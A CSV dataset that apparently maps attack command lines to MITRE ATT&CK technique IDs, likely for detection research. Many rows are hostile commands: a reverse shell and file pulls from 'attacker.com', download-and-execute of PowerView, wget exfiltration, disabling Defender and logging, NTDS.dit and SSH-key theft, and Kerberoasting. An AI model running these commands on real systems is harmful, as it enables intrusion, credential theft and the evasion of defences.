command,mitre_id
"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -preTraceCmd {PATH:.exe}",T1202
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}",T1218
xpad -f /path/to/input-file,T1005
find . -exec /bin/sh \; -quit,T1059
"C:\Windows\System32\cmd.exe /c net group ""Domain Admins"" /domain",T1087
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f",T1112
"if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo ""$HISTFILE is larger than 1k""; fi",T1562
"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""",T1127
cat /dev/null > /var/log/messages #truncating the file to zero bytes,T1070
C:\AMD\Temp,T1074
chroot /,T1059
"vaultcmd /listcreds:""Windows Credentials"" /all",T1555
%SystemRoot%\NTDS\Ntds.dit,T1003
dos2unix -f -O /path/to/input-file,T1005
rsync -r $local_path $username@$remote_host:$remote_path,T1105
SysListView32,T1055
"Set-ItemProperty ""HKLM:\Software\Microsoft\Windows Defender"" -Name ""PUAProtection"" -Value 0",T1562
rustdoc /path/to/temp-file -o /path/to/output-dir/,T1222
fork(),T1036
"$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, ""Closing"", [System.Threading.CancellationToken]::None).Wait()",T1539
Xxsh,T1059
yum,T1105
"wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet",T1003
basenc --base64 /path/to/input-file | basenc -d --base64,T1005
cat >/path/to/temp-dir/filter.d/x.conf <<EOF,T1059
NtCreateProcess,T1106
"echo ""*** Configuration recorder stopped ***""",T1562
vi -c :terminal /bin/sh,T1059
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine"" -Name ""MpEnablePus"" -Value 0",T1562
"Write-Host ""Waiting 2s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
"echo ""starting detonate""",T1552
dlsym(),T1129
if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null },T1562
echo '{' >> $rc_service_path/$rc_service_file,T1543
iptables -F,T1562
wevtutil cl system,T1070
find $search_path -name id_rsa 2>/dev/null -exec cp --parents {} $output_folder \;,T1552
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v ProductName",T1082
arch-nspawn .,T1059
pygmentize -l text /path/to/input-file,T1005
"xcopy /I /Y ""$web_shells"" $web_shell_path",T1505
echo DATA | nc -u 127.127.127.127 12345,T1222
obfuskittiedump -consoleoutput -noninteractive,T1078
C:\Windows\System32\osk.exe,T1546
/sbin/udevd -d,T1036
public const uint TOKEN_QUERY = 0x0008;,T1562
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit""",T1003
"guile -c '(system ""/bin/sh"")'",T1059
dlopen(),T1129
"cd ""PathToAtomicsFolder\..\ExternalPayloads""",T1087
touch -acmr $reference_file_path $target_file_path,T1070
del /f $file_to_delete,T1070
diantz,T1560
CLSID_ShellLink,T1559
powershell Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct,T1518
usermod --lock art,T1078
openssl genrsa -out $key_filename 4096,T1553
"dscl . -create /Users/$username UniqueID ""1010""",T1136
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1""",T1555
scp.exe $local_path\$file_name $username@$remote_host:$remote_path,T1105
quser,T1033
dfrgui.exe,T1057
Enable-PSRemoting -Force,T1021
net group,T1098
LineDDA,T1106
OneNote Update,T1547
[System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {,T1083
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRealtimeMonitoring"" -Value 1",T1562
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose,T1069
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""StubPath"" ""$payload"" -Force",T1547
net user /add,T1136
DeleteFileA,T1070
"{echo ""FTP Server Unreachable. Please verify the server address in input args and try again.""}",T1048
browserpwn -consoleoutput -noninteractive,T1555
"pushd ""$output_dir""",T1140
echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config,T1059
dnx.exe {PATH_ABSOLUTE:folder},T1127
"echo var url = ""$file_url"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > $script_file",T1204
"net groups ""Exchange Organization Management"" /domain",T1069
qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file,T1005
"if [ ""$(sysctl -n hw.model | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;",T1497
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId,T1098
Stop-Process $notepad.id,T1055
mkdir -p ./etc/,T1059
echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt,T1486
unshare /bin/sh,T1059
<devices>,T1059
".\kerbrute.exe passwordspray --dc $domaincontroller -d $domain ""PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"" password132",T1110
"if [ $(history |wc -l) -eq 1 ]; then echo ""ls commands are not in history""; fi",T1562
"""$file_path""",T1548
nohup,T1564
"Copy-Item -Path $termsrvDll -Destination ""$HOME\AtomicTest.dll""",T1505
GMER64.sys,T1562
InstallUtil.exe,T1218
%PROGRAMDATA%\Windows\,T1564
"""$vboxmanage_exe"" modifyvm ""$vm_name"" --firmware efi",T1564
rm -rf /var/log/messages,T1070
service pf stop,T1562
pwd.py,T1083
s/path/to/output-file,T1222
docker run,T1543
Sdl,T1070
"New-Item -Path ""$output_path"" -ItemType Directory > $null",T1069
"Rundll32.exe apphelp.dll,ShimFlushCache",T1112
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f,T1112
echo $ENCODED > $encoded_file && xxd -r -p $encoded_file,T1140
"emacs -Q -nw --eval '(term ""/bin/sh"")'",T1059
HKCU\Software\Microsoft\Internet Explorer\ PhishingFilter\,T1112
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""",T1202
useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art,T1078
"wmic process get caption,executablepath,commandline /format:csv",T1047
security import $cert_export -k,T1555
csh -c 'echo DATA >/path/to/output-file',T1222
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $File_to_output,T1083
0xAA,T1027
"ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String ""password"", ""-p"", ""key"", ""pwd"", ""pass""",T1552
dotnet -h > nul,T1574
"echo ""OnCalendar=*-*-* *:*:00"" >> $path_to_systemd_timer",T1053
RecoveryExTask,T1036
cmd /c systeminfo,T1082
"""$local_folder\$local_executable"" ptt /ticket:kirbifile",T1558
"echo ""$TEMPDIR"" > /tmp/atomic_python_hook_path.txt",T1546
dllhost.exe,T1546
WinEggDrop,T1046
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll"" /f",T1137
Add-Type -AssemblyName System.DirectoryServices.AccountManagement,T1136
}).listen(12345)',T1059
Mftrace.exe {PATH:.exe},T1127
SleepEx,T1106
Software\Microsoft\Windows\CurrentVersion\Uninstall,T1012
"julia -e 'using Sockets; sock=connect(""attacker.com"", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'",T1059
SuspendThread,T1055
scp user@attacker.com:/path/to/input-file /path/to/output-file,T1105
function MatchesExtension($path) {,T1083
"echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js",T1105
useradd,T1136
aws cloudtrail stop-logging --name $cloudtrail_name --region $region,T1562
zsh -c 'echo DATA >/path/to/output-file',T1222
Hostname_UserName.txt,T1074
msgfilter -P -i /path/to/input-file /bin/cat,T1005
service art-test enable,T1543
echo Get-Process | clip,T1115
chown -R $owner:$group $file_or_folder,T1222
"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}",T1218
echo /path/to/command | at now,T1059
"echo 'echo ""User: $(whoami)""' >> /tmp/art_payload.sh",T1027
arj e x /path/to/output-dir/,T1222
Import-Module ExchangeOnlineManagement,T1098
Software\Classes\scConfig,T1027
"""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI""",T1012
sc start $service_name,T1543
CREATE_NO_WINDOW,T1564
SysWOW64,T1055
OneDriveStandaloneUpdater,T1105
Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log},T1127
timeIntervalSinceNow,T1124
%temp%\T1036.007_masquerading.docx.exe,T1036
Duser.dll,T1574
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1060
"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'",T1005
HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer,T1112
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1012
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml},T1218
ShowWindow,T1564
"sc.exe create $service_name binPath= ""$binary_path"" start=$startup_type type=$service_type",T1543
"pnputil.exe /add-driver ""$driver_inf""",T1547
fsutil.exe usn deletejournal /d c:,T1485
systemctl start,T1569
sc.exe \\$remote_host start $service_name,T1543
<source>,T1222
ufw disable,T1562
Expected: $ExpectedOutput,T1218
apiVersion: client.authentication.k8s.io/v1,T1059
psexec.py '$domain/$username:$password@$remote_host' '$command',T1569
"mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then echo ""Modification for Atomic Red Test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""; fi; fi; done",T1070
pyright --outputjson /path/to/input-file,T1005
StartType = $p.Start,T1007
"wmic /node: ""$machine"" process call create ""regsvr32.exe /i $remote_drive_letter:$exe_remote_folder""}",T1105
set +o history,T1070
"echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f -",T1562
"([adsisearcher]""objectcategory=user"").FindAll(); ([adsisearcher]""objectcategory=user"").FindOne()",T1087
$word.Quit(),T1137
.desktop,T1547
echo Triggering fodhelper.exe for potential privilege escalation...,T1548
kubectl run $pod_name --image=$image_name --restart=Never --rm -it -- sh -lc 'adduser -D $username && id $username',T1136
SetLastError,T1106
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1060
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid,T1082
echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file,T1059
/etc/udev/rules.d/,T1546
taskkill -f -im calc.exe,T1218
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905},T1547
cmdl32 /vpn /lan %cd%\config,T1105
(macOS) or,T1564
compare,T1106
$which_openssl genrsa -out $private_key_path $encryption_bit_size,T1486
wevutil,T1070
sudo chown root $file_to_setuid,T1548
Add-Type -AssemblyName Microsoft.Office.Interop.Word,T1137
MAVInject.exe,T1218
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f,T1112
curl --engine /path/to/lib.so x,T1574
unzip -p /path/to/temp-file,T1005
@reboot,T1053
"bash -c ""{echo,\""$(echo $ENCODED)\""}|{base64,-d}""",T1140
while ((line = br.readLine()) != null) { print(line); },T1005
curl -O $remote_url/sqlite_dump.sh,T1005
Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection},T1119
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon,T1547
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe},T1105
IsDebuggerPresent(),T1622
wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List,T1518
Filter = $Filter;,T1546
OutputDebugStringA,T1622
load_module /path/to/lib.so,T1574
"openssl req -x509 -new -nodes -key $key_filename -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out $cert_filename",T1553
GetLocaleInfoW,T1614
"$info.GetEnumerator() | ForEach-Object { ""$($_.Name): $($_.Value)"" }",T1614
mpsvc.mui,T1574
New-UserPersistenceOption,T1547
type C:\Windows\Panther\unattend.xml,T1552
sc.exe sdset scmanager D:(A;;KA;;;WD),T1569
printf $ENCODED | base64 -d,T1140
tasklist.exe,T1518
"reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\Users\Public\AtomicTest.dll"" /f",T1546
"Write-Output ""Please choose a valid execution_option""",T1528
"Write-Host ""Service Principal $($sp.DisplayName) was added to $($role.DisplayName)""",T1098
control.exe {PATH_ABSOLUTE:.cpl},T1218
mount –o bind /proc/benign-process /proc/malicious-process,T1564
libevent,T1546
net stop <process>,T1489
"socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat",T1105
echo $HISTFILESIZE,T1562
"cd ""$rclone_path""",T1567
"if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;",T1016
echo AC_INIT >configure.ac,T1059
show arp,T1018
./stratus warmup aws.discovery.ec2-enumerate-from-instance,T1580
"New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32' -Name 'ThreadingModel' -Value '$clsid_threading' -PropertyType ""String""",T1546
"if (test-path ""$FirefoxCredsLocation\logins.json"") {copy-item ""$FirefoxCredsLocation\logins.json"" -destination ""$exfil_folder\T1555.003Firefox_logins.json""} else {}",T1555
"if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT""; fi",T1562
New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null,T1119
WSUSPROXY,T1070
clip < %temp%\T1115.txt,T1115
tmate -c /bin/sh,T1059
go run /path/to/temp-file.go,T1059
"$ADSearch.PropertiesToLoad.Add(""displayName"") | Out-Null",T1552
"dir ""%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> $output_file",T1083
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,T1105
comm /path/to/input-file /dev/null,T1005
enscript /dev/null -qo /dev/null -I '/bin/sh >&2',T1059
"reg query ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components""",T1012
VirtualAllocExNuma,T1055
"copy ""$exe_path"" %temp%\T1036.007_masquerading.ps1.exe /Y",T1036
show version,T1082
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f",T1484
Restart-Service -Name EventLog -Force -ErrorAction Ignore,T1562
ClearBrowsingHistoryOnExit,T1070
cabal exec --project-file=/dev/null -- /bin/sh,T1059
chattr,T1222
regsvr32.exe /s /i,T1218
Add-MpPreference -ExclusionPath $excludedpath,T1562
C:\Users\\%username%\Documents\Default.rdp,T1070
SHEmptyRecycleBinW(),T1490
powershell -Command exit,T1546
ip netns exec bar /bin/sh,T1059
AdjustTokenPrivilege,T1134
3e2717e8b3873b29,T1027
net user $guest_user /active:yes,T1078
ForEach-Object {,T1007
%temp%\tcm.tmp -encode $executable %temp%\T1140_calc2.txt,T1140
bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,T1564
sudo touch /private/var/db/emondClients/T1546.014,T1546
redis-cli -h 127.0.0.1,T1222
SetContextThread,T1055
"$sheet.Cells.Item(21,1) = ""=WAIT(NOW()+`""00:00:05`"")""",T1204
contentsOfDirectoryAtPath,T1106
volatility -f /path/to/core-dump volshell,T1548
CreateProcessAsUser,T1546
"Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap""",T1558
asterisk -r,T1059
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$target_binary"" /v ReportingMode /t REG_DWORD /d 1",T1546
klist,T1558
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose,T1135
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Gui"" -NoRestart -ErrorAction Ignore",T1562
"wget --post-file=""$input_file"" --timeout=5 --no-check-certificate $endpoint_domain --delete-after",T1048
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore,T1558
"Write-Host ""[i] Using Interface $interface""",T1046
"get-process | ?{$_.Description -like ""*defender*""}",T1518
CreationTime,T1070
ObtainUserAgentString,T1106
sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true,T1564
chmod +x /path/to/temp-file,T1059
LSADUMP::SetNTLM,T1098
echo $(openssl passwd -1 art) | pw mod user nobody -h 0,T1078
aria2c -i /path/to/input-file,T1005
xargs -a /dev/null /bin/sh,T1059
Remove-AzEventHub -ResourceGroupName $resource_group -Namespace $name_space_name -Name $event_hub_name,T1562
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f",T1112
LoadLibrary(),T1027
cp /path/to/input-file /path/to/output-file,T1548
xxd /path/to/input-file | xxd -r,T1005
touch,T1070
ExecStartPre,T1543
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load,T1012
echo 'sleep 5' | /tmp/crond,T1036
%Program Data%\\Microsoft\\,T1574
icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t,T1546
kubectl get secrets -n $namespace,T1552
fw.close();',T1222
$User.Save(),T1136
"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe""",T1027
echo /path/to/input-file | cpio -o,T1005
pam_unix.so,T1556
sudo systemctl stop falcon-sensor.service,T1562
"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='ls*:rm*:ssh*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi",T1562
conhost.exe --headless {CMD},T1202
CryptStringToBinaryA,T1140
"Start-Process -FilePath ""$autohotkey_path"" -ArgumentList ""$script_path""",T1059
git -C . commit --allow-empty -m x,T1059
if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue },T1562
